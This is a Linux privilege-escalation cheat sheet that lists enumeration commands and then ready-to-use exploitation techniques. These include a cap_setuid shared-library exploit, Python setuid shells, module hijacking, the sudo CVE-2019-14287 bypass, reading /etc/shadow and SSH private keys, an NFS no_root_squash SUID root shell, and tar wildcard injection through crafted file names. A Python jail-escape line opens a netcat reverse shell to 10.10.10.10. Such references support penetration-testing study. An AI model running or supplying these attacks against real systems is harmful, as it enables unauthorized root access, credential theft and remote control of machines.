## Enumeration
### Display general overview of current user
```bash
id
```
### Get hostname of target machine
```bash
hostname
```
### Print kernel information
```bash
uname -a
```
### Print additional kernel information
```bash
cat /proc/version
```
### View all running processes
```bash
ps -A
```
### View process tree
```bash
ps axjf
```
### Display processes of all users, process’ owners, non terminal attached processes
```bash
ps aux
```
### View environment variables
```bash
env
```
### Check user’s sudo privileges
```bash
sudo -l
```
### View all system users
```bash
cat /etc/passwd | cut -d ":" -f 1
```
```bash
cat /etc/passwd | grep home
```
### View terminal command history
```bash
history
```
### View network interfaces within the system
```bash
ifconfig
```
### View network routes within the system
```bash
ip route
```
### View listening ports and connections within the system
```bash
netstat -a

Note: add "t" or "u" to list TCP or UDP results i.e netstat -at
```
### Find all readable files by the current user
```bash
find /etc -maxdepth 1 -readable -type f
```
### Find backups within the system
```bash
# ! in this instance means "not equals to"
find / -newermt "date_from" ! -newermt "date_to" -ls

# we can also add the following to remove specific directories from results
| grep -v ' /etc\\| /var/lib\\| /sys\\| /proc\\| /boot' 2> /dev/null
```
### Find SUID binaries
```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \\;
```
```bash
find / -uid 0 -perm -4000 -type f 2>/dev/null
```
### Find capabilities
```bash
getcap -r / 2>/dev/null
```
### View NFS configuration
```bash
cat /etc/exports
```
### View scheduled tasks
```bash
crontab -l
```
```bash
ls -al /etc/cron* /etc/at*
```
```bash
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### View installed software
Debian based distribution
```bash
dpkg -l
```
CentOS based distribution
```bash
rpm -qa
```
### Check ASLR status
Value of `1` if ASLR is enabled, otherwise value is `0`
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
```
### Using automated scripts
- [https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
## Exploitation
### Abusing SUID
Search SUID and follow instructions provided by [https://gtfobins.github.io/](https://gtfobins.github.io/)
### Sudo vulnerability CVE-2019-14287
If `sudo -l` returned `(ALL, !root)` and is below version 1.8.28, this method might work.
```bash
sudo -u#-1
```
Read more at [https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability](https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability)
### Sudo using absolute path
If `sudo -l` returned `(ALL) NOPASSWD: /path/to/bin /path/to/file`, this method might work.
```bash
sudo /path/to/bin /path/to/file
```
### View sensitive files if apache2 is in sudo privileges
```bash
sudo apache2 -f /etc/shadow
```
### Misconfigured executable permission on a folder
If a folder has executable permissions, commands can be used to view its contents
```bash
Total 1
drwx--x--x  2 admin        admin        4096 Jul  3  2020 secret
```
```bash
cat secret/.ssh/id_rsa
```
### Abusing Unix capabilities
If any binary has capabilities set to `cap_setuid+ep`. We can abuse it to gain root privileges by changing our UID to `0`. Below is an example using OpenSSL.
```c
#include <unistd.h>

__attribute__((constructor))
static void init() {
    setuid(0); // root
    execl("/bin/sh", "sh", NULL);
}
```
```bash
gcc -fPIC -o exploit.o -c exploit.c && gcc -shared -o exploit.so -lcrypto exploit.o
```
```bash
openssl req -engine ./exploit.so
```
Another example using Python
```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
### Hijacking relative PATHs
This is only applicable when a binary is calling another binary using relative path instead of an absolute path. The binary being called can be replaced by a malicious one with the same name but on a different directory, preferably in `/tmp` or `/dev/shm`. More information can be found [here](https://youtu.be/PgQyuogGgPI?t=4140).
- `chmod 600 /file` is a relative path
- `/usr/bin/chmod 600 /file` is an absolute path
```bash
PATH=/tmp:$PATH /target_file/calling_relative/path_binary
```
### Python module manipulation
This is only applicable when a python file is present and is importing a package. This can be used as a vector for privilege escalation by replacing the package with a malicious version. More information can be found [here](https://youtu.be/v8pJDTpaLXY?t=600).
```python
#!/usr/bin/python
import os
print("This is a malicious random.py module.")
os.system("/bin/bash")
```
```python
#!/usr/bin/python
import random # this will run random.py instead of the original random package.

print("PrivEsc using Python Module Manipulation")
```
### Escaping Python jail to gain shell
```python
#!/usr/bin/python

__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.10.10 4444 >/tmp/f')
```
### Abusing NFS misconfiguration no_root_squash
Check if NFS share can be mounted on your local machine
```bash
showmount -e 10.10.10.10
```
Create a `/tmp/mount` and mount NFS share on your local machine to the created folder
```bash
mkdir /tmp/mount
```
```bash
mount -o rw,vers=2 10.10.10.10:/nfs /tmp/mount
```
Create `rootshell.c` and compile it
```c
int main() {
    setresuid(0,0,0);
    setresgid(0,0,0);
    system("/bin/bash");
}
```
```nix
gcc rootshell.c -o rootshell
```
Copy `rootshell` executable to the mounted share and set SUID bit
```bash
cp rootshell /tmp/mount
```
```bash
chmod +s /tmp/mount/rootshell
```
On target host, run the `rootshell` executable to gain root shell
```bash
/tmp/rootshell
```
## TAR Wildcard Injection
If a command is calling for a wildcard we may be able to inject a command instead. This is possible by tricking the `tar` command into running arbitrary commands as root using a wildcard injection. This works by using the `--checkpoint` and `--checkpoint-action` flags accepted by `tar`. Example of a vulnerable command:
```bash
tar -cf /opt/backups/website.tar *
```
In order to exploit this, we run the following commands inside the `/opt/backups` directory:
```nix
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
## Other Resources
- [https://book.hacktricks.xyz/linux-hardening/privilege-escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)